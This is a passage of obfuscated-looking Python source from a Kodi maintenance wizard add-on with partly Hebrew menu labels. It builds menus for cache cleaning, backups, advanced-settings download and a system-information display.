		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2440
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2441
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2442
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2444
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2445
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2446
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2448
def maintMenu (view =None ):#line:2452
	O000000O0OO00OOO0 ='[B][COLOR green]ON[/COLOR][/B]';OOO0O00OOO0O000OO ='[B][COLOR red]OFF[/COLOR][/B]'#line:2454
	O0OO0O0O0O0000O00 ='true'if AUTOCLEANUP =='true'else 'false'#line:2455
	OO0OOO00OOO00O00O ='true'if AUTOCACHE =='true'else 'false'#line:2456
	O0O0OOOO000O0OOO0 ='true'if AUTOPACKAGES =='true'else 'false'#line:2457
	OOOOO000OOO00O0OO ='true'if AUTOTHUMBS =='true'else 'false'#line:2458
	OOOOO0OOOO000O000 ='true'if SHOWMAINT =='true'else 'false'#line:2459
	OOOO0OOO0OOO0OOOO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2460
	OOO0O00OOO0O0OOOO ='true'if INCLUDEALL =='true'else 'false'#line:2461
	OO0O0O0OO0000000O ='true'if THIRDPARTY =='true'else 'false'#line:2462
	if wiz .Grab_Log (True )==False :OOOOO0O000OO00000 =0 #line:2463
	else :OOOOO0O000OO00000 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2464
	if wiz .Grab_Log (True ,True )==False :O0OO00OOOOO0OO0O0 =0 #line:2465
	else :O0OO00OOOOO0OO0O0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2466
	OO0OO000OOOO00OO0 =int (OOOOO0O000OO00000 )+int (O0OO00OOOOO0OO0O0 )#line:2467
	O00O000OOOO00O0O0 =str (OO0OO000OOOO00OO0 )+' Error(s) Found'if OO0OO000OOOO00OO0 >0 else 'None Found'#line:2468
	O00OOOO00OO00OOO0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2469
	if OOO0O00OOO0O0OOOO =='true':#line:2470
		OO0O0OOO0000000O0 ='true'#line:2471
		OOOOO00O00000O00O ='true'#line:2472
		O000OO0O0O0000O0O ='true'#line:2473
		OOOOOO0O00O00OO0O ='true'#line:2474
		O000000O0OOO0O0O0 ='true'#line:2475
		O00OOOOOOOOOO0OO0 ='true'#line:2476
		O000O00OO00OOOO0O ='true'#line:2477
		OO0000O0OOO00000O ='true'#line:2478
	else :#line:2479
		OO0O0OOO0000000O0 ='true'if INCLUDEBOB =='true'else 'false'#line:2480
		OOOOO00O00000O00O ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2481
		O000OO0O0O0000O0O ='true'if INCLUDESPECTO =='true'else 'false'#line:2482
		OOOOOO0O00O00OO0O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2483
		O000000O0OOO0O0O0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2484
		O00OOOOOOOOOO0OO0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2485
		O000O00OO00OOOO0O ='true'if INCLUDESALTS =='true'else 'false'#line:2486
		OO0000O0OOO00000O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2487
	OOOOO00O00O00OOOO =wiz .getSize (PACKAGES )#line:2488
	OOOO0O0O00O00O000 =wiz .getSize (THUMBS )#line:2489
	OO0O00O0000000O00 =wiz .getCacheSize ()#line:2490
	OOOO0O000OO0OOOO0 =OOOOO00O00O00OOOO +OOOO0O0O00O00O000 +OO0O00O0000000O00 #line:2491
	O00O00000O0OO0O0O =['Daily','Always','3 Days','Weekly']#line:2492
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2493
	if view =="clean"or SHOWMAINT =='true':#line:2494
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOO0O000OO0OOOO0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2495
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O00O0000000O00 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2496
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOO00O00O00OOOO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2497
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOO0O0O00O00O000 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2498
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2499
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2500
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2501
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2502
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2503
	if view =="addon"or SHOWMAINT =='false':#line:2504
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2505
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2506
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2507
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2508
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2509
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2510
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2511
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2512
	if view =="misc"or SHOWMAINT =='true':#line:2513
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2514
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2515
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2516
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2517
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2518
		addFile ('View Errors in Log: %s'%(O00O000OOOO00O0O0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2519
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2520
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2521
		addFile ('Clear Wizard Log File%s'%O00OOOO00OO00OOO0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2522
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2523
	if view =="backup"or SHOWMAINT =='true':#line:2524
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2525
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2526
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2527
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2528
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2529
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2530
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2531
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2532
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2533
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2534
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2535
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2536
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2537
	if view =="tweaks"or SHOWMAINT =='true':#line:2538
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2539
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2540
		else :#line:2541
			if os .path .exists (ADVANCED ):#line:2542
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2543
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2544
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2545
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2546
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2547
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2548
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2549
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2550
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2551
	addFile ('Show All Maintenance: %s'%OOOOO0OOOO000O000 .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2552
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2553
	addFile ('Third Party Wizards: %s'%OO0O0O0OO0000000O .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2554
	if OO0O0O0OO0000000O =='true':#line:2555
		OO0O00O000O000OOO =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2556
		OOO00OOO00OO0OOO0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2557
		O0OOOOOOOO00OO0OO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2558
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O00O000O000OOO ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2559
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO00OOO00OO0OOO0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2560
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OOOOOOOO00OO0OO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2561
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2562
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0OO0O0O0O0000O00 .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2563
	if O0OO0O0O0O0000O00 =='true':#line:2564
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O00O00000O0OO0O0O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2565
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO0OOO00OOO00O00O .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2566
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0O0OOOO000O0OOO0 .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2567
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OOOOO000OOO00O0OO .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2568
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2569
	addFile ('Include Video Cache in Clear Cache: %s'%OOOO0OOO0OOO0OOOO .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2570
	if OOOO0OOO0OOO0OOOO =='true':#line:2571
		addFile ('--- Include All Video Addons: %s'%OOO0O00OOO0O0OOOO .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2572
		addFile ('--- Include Bob: %s'%OO0O0OOO0000000O0 .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2573
		addFile ('--- Include Phoenix: %s'%OOOOO00O00000O00O .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2574
		addFile ('--- Include Specto: %s'%O000OO0O0O0000O0O .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2575
		addFile ('--- Include Exodus: %s'%O000000O0OOO0O0O0 .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2576
		addFile ('--- Include Salts: %s'%O000O00OO00OOOO0O .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2577
		addFile ('--- Include Salts HD Lite: %s'%OO0000O0OOO00000O .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2578
		addFile ('--- Include One Channel: %s'%O00OOOOOOOOOO0OO0 .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2579
		addFile ('--- Include Genesis: %s'%OOOOOO0O00O00OO0O .replace ('true',O000000O0OO00OOO0 ).replace ('false',OOO0O00OOO0O000OO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2580
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2581
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2582
	setView ('files','viewType')#line:2583
def advancedWindow (url =None ):#line:2585
	if not ADVANCEDFILE =='http://':#line:2586
		if url ==None :#line:2587
			O00O00000000000O0 =wiz .workingURL (ADVANCEDFILE )#line:2588
			O0OO000OO00O00000 =uservar .ADVANCEDFILE #line:2589
		else :#line:2590
			O00O00000000000O0 =wiz .workingURL (url )#line:2591
			O0OO000OO00O00000 =url #line:2592
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2593
		if os .path .exists (ADVANCED ):#line:2594
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2595
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2596
		if O00O00000000000O0 ==True :#line:2597
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2598
			OO000OOO0OOOOO0O0 =wiz .openURL (O0OO000OO00O00000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2599
			O0O0OO0O0OO000OOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO000OOO0OOOOO0O0 )#line:2600
			if len (O0O0OO0O0OO000OOO )>0 :#line:2601
				for O0OO0OOOO00OO00OO ,O0OO000O0O0000O00 ,url ,O000000OOO00O00O0 ,OOOOO0O0OOOO00OO0 ,O00O00O0O0O0O0O00 in O0O0OO0O0OO000OOO :#line:2602
					if O0OO000O0O0000O00 .lower ()=="yes":#line:2603
						addDir ("[B]%s[/B]"%O0OO0OOOO00OO00OO ,'advancedsetting',url ,description =O00O00O0O0O0O0O00 ,icon =O000000OOO00O00O0 ,fanart =OOOOO0O0OOOO00OO0 ,themeit =THEME3 )#line:2604
					else :#line:2605
						addFile (O0OO0OOOO00OO00OO ,'writeadvanced',O0OO0OOOO00OO00OO ,url ,description =O00O00O0O0O0O0O00 ,icon =O000000OOO00O00O0 ,fanart =OOOOO0O0OOOO00OO0 ,themeit =THEME2 )#line:2606
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2607
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O00O00000000000O0 )#line:2608
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2609
def writeAdvanced (O000O000O000OO000 ,O00000000O0O0OO00 ):#line:2611
	OOOOO0OOOOO00000O =wiz .workingURL (O00000000O0O0OO00 )#line:2612
	if OOOOO0OOOOO00000O ==True :#line:2613
		if os .path .exists (ADVANCED ):OO0000OO00OO00000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O000O000O000OO000 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2614
		else :OO0000OO00OO00000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O000O000O000OO000 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2615
		if OO0000OO00OO00000 ==1 :#line:2617
			O0OO00OOOO000OO00 =wiz .openURL (O00000000O0O0OO00 )#line:2618
			OO00OO0OOOO00O000 =open (ADVANCED ,'w');#line:2619
			OO00OO0OOOO00O000 .write (O0OO00OOOO000OO00 )#line:2620
			OO00OO0OOOO00O000 .close ()#line:2621
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2622
			wiz .killxbmc (True )#line:2623
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2624
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOOO0OOOOO00000O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2625
def viewAdvanced ():#line:2627
	OOOO00O0OOOOO0O00 =open (ADVANCED )#line:2628
	O00OOOO0OOO0O00O0 =OOOO00O0OOOOO0O00 .read ().replace ('\t','    ')#line:2629
	wiz .TextBox (ADDONTITLE ,O00OOOO0OOO0O00O0 )#line:2630
	OOOO00O0OOOOO0O00 .close ()#line:2631
def removeAdvanced ():#line:2633
	if os .path .exists (ADVANCED ):#line:2634
		wiz .removeFile (ADVANCED )#line:2635
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2636
def showAutoAdvanced ():#line:2638
	notify .autoConfig ()#line:2639
def getIP ():#line:2641
	OO0O0O0OOOO000O0O ='http://whatismyipaddress.com/'#line:2642
	if not wiz .workingURL (OO0O0O0OOOO000O0O ):return 'Unknown','Unknown','Unknown'#line:2643
	OO00OOOOOO000O0O0 =wiz .openURL (OO0O0O0OOOO000O0O ).replace ('\n','').replace ('\r','')#line:2644
	if not 'Access Denied'in OO00OOOOOO000O0O0 :#line:2645
		OOO00O0O00O0OOO0O =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OO00OOOOOO000O0O0 )#line:2646
		OOO00000O0OO0OOOO =OOO00O0O00O0OOO0O [0 ]if (len (OOO00O0O00O0OOO0O )>0 )else 'Unknown'#line:2647
		OOOO000000000O0OO =re .compile ('"font-size:14px;">(.+?)</td>').findall (OO00OOOOOO000O0O0 )#line:2648
		O0000O0OO0O000O00 =OOOO000000000O0OO [0 ]if (len (OOOO000000000O0OO )>0 )else 'Unknown'#line:2649
		OO0O0O00OOO000000 =OOOO000000000O0OO [1 ]+', '+OOOO000000000O0OO [2 ]+', '+OOOO000000000O0OO [3 ]if (len (OOOO000000000O0OO )>2 )else 'Unknown'#line:2650
		return OOO00000O0OO0OOOO ,O0000O0OO0O000O00 ,OO0O0O00OOO000000 #line:2651
	else :return 'Unknown','Unknown','Unknown'#line:2652
def systemInfo ():#line:2654
	O00O0OOO000O0O00O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2668
	O0O0OOOO0O00000O0 =[];O00OOO0O00OO00O00 =0 #line:2669
	for OOOOOO0OO0OOOO0OO in O00O0OOO000O0O00O :#line:2670
		O0O00000O0000O000 =wiz .getInfo (OOOOOO0OO0OOOO0OO )#line:2671
		O0OO000OOO000OOOO =0 #line:2672
		while O0O00000O0000O000 =="Busy"and O0OO000OOO000OOOO <10 :#line:2673
			O0O00000O0000O000 =wiz .getInfo (OOOOOO0OO0OOOO0OO );O0OO000OOO000OOOO +=1 ;wiz .log ("%s sleep %s"%(OOOOOO0OO0OOOO0OO ,str (O0OO000OOO000OOOO )));xbmc .sleep (1000 )#line:2674
		O0O0OOOO0O00000O0 .append (O0O00000O0000O000 )#line:2675
		O00OOO0O00OO00O00 +=1 #line:2676
	O0OOOOO0000OOO0O0 =O0O0OOOO0O00000O0 [8 ]if 'Una'in O0O0OOOO0O00000O0 [8 ]else wiz .convertSize (int (float (O0O0OOOO0O00000O0 [8 ][:-8 ]))*1024 *1024 )#line:2677
	OO000OOOO00O00O0O =O0O0OOOO0O00000O0 [9 ]if 'Una'in O0O0OOOO0O00000O0 [9 ]else wiz .convertSize (int (float (O0O0OOOO0O00000O0 [9 ][:-8 ]))*1024 *1024 )#line:2678
	OOO0OOOO00OO0O00O =O0O0OOOO0O00000O0 [10 ]if 'Una'in O0O0OOOO0O00000O0 [10 ]else wiz .convertSize (int (float (O0O0OOOO0O00000O0 [10 ][:-8 ]))*1024 *1024 )#line:2679
	OOO0O0O000OOOO00O =wiz .convertSize (int (float (O0O0OOOO0O00000O0 [11 ][:-2 ]))*1024 *1024 )#line:2680
	O00000O0O0000000O =wiz .convertSize (int (float (O0O0OOOO0O00000O0 [12 ][:-2 ]))*1024 *1024 )#line:2681
	O00OO0O0OO0OO0000 =wiz .convertSize (int (float (O0O0OOOO0O00000O0 [13 ][:-2 ]))*1024 *1024 )#line:2682
	OOOO0OOO0OO0OOOO0 ,O00O0O0O0OOOOOOOO ,OOO00O0OO0O00OOOO =getIP ()#line:2683
	OOOO000OOOOOO00O0 =[];O00O00000O0O0O00O =[];OO0O0OOO000OO0OOO =[];O0OOO0OOO00000O0O =[];OO0OOO0OO0OOOO0OO =[];O0O00O000O0O0O00O =[];O0O000O00OOO00OO0 =[]#line:2685
	O0OO00O0O0OO00OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2687
	for OOO0OOOO0OOOO0000 in sorted (O0OO00O0O0OO00OOO ,key =lambda OO0O000O000OOO000 :OO0O000O000OOO000 ):#line:2688
		OO0OOOO000O0OOOO0 =os .path .split (OOO0OOOO0OOOO0000 [:-1 ])[1 ]#line:2689
		if OO0OOOO000O0OOOO0 =='packages':continue #line:2690
		OO00O0OO000OOOO00 =os .path .join (OOO0OOOO0OOOO0000 ,'addon.xml')#line:2691
		if os .path .exists (OO00O0OO000OOOO00 ):#line:2692
			O0OO0O000OO0OOOO0 =open (OO00O0OO000OOOO00 )#line:2693
			O0OOOOO0O00O0OOOO =O0OO0O000OO0OOOO0 .read ()#line:2694
			O00O0000O00OO0OOO =re .compile ("<provides>(.+?)</provides>").findall (O0OOOOO0O00O0OOOO )#line:2695
			if len (O00O0000O00OO0OOO )==0 :#line:2696
				if OO0OOOO000O0OOOO0 .startswith ('skin'):O0O000O00OOO00OO0 .append (OO0OOOO000O0OOOO0 )#line:2697
				if OO0OOOO000O0OOOO0 .startswith ('repo'):OO0OOO0OO0OOOO0OO .append (OO0OOOO000O0OOOO0 )#line:2698
				else :O0O00O000O0O0O00O .append (OO0OOOO000O0OOOO0 )#line:2699
			elif not (O00O0000O00OO0OOO [0 ]).find ('executable')==-1 :O0OOO0OOO00000O0O .append (OO0OOOO000O0OOOO0 )#line:2700
			elif not (O00O0000O00OO0OOO [0 ]).find ('video')==-1 :OO0O0OOO000OO0OOO .append (OO0OOOO000O0OOOO0 )#line:2701
			elif not (O00O0000O00OO0OOO [0 ]).find ('audio')==-1 :O00O00000O0O0O00O .append (OO0OOOO000O0OOOO0 )#line:2702
			elif not (O00O0000O00OO0OOO [0 ]).find ('image')==-1 :OOOO000OOOOOO00O0 .append (OO0OOOO000O0OOOO0 )#line:2703
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2705
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOO0O00000O0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2706
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOO0O00000O0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2707
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2708
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOO0O00000O0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2709
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOO0O00000O0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2710
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2712
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOO0O00000O0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2713
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOO0O00000O0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2714
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2716
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOOO0000OOO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2717
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000OOOO00O00O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2718
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOO00OO0O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2719
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2721
